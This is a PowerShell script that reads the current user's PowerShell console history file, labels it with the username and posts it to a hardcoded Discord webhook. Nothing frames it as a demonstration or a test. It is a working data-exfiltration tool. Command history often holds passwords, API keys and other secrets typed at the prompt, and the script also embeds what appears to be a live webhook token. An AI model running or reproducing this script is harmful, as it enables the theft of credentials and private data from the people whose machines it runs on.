 # Discord webhook URL
$WebhookUrl = "https://discord.com/api/webhooks/1388015235138453544/LimqlEPv6I7wmXq2nWXCc-vsb6lJ3qlYiLlwvhjInzXRqeejOFQBmYZXnOm0gXu9WGt6"

# Path to the history file
$HistoryFile = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

# Check if the file exists
if (-Not (Test-Path $HistoryFile)) {
    Write-Host "PowerShell history file not found."
    exit
}

# Read the file content
$HistoryContent = Get-Content -Path $HistoryFile -Raw

# Truncate if too long (Discord limit ~2000 characters per message)
if ($HistoryContent.Length -gt 1900) {
    $HistoryContent = $HistoryContent.Substring(0, 1900) + "`n...(truncated)"
}

# Just make a plain message (no backticks)
$Message = "**PowerShell Command History from $env:USERNAME**`n" + $HistoryContent

# Create payload
$Payload = @{
    content = $Message
}

# Convert to JSON safely
$JsonPayload = $Payload | ConvertTo-Json -Depth 3

# Send the POST request
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $JsonPayload -ContentType 'application/json'

Write-Host "PowerShell history sent to Discord."
 
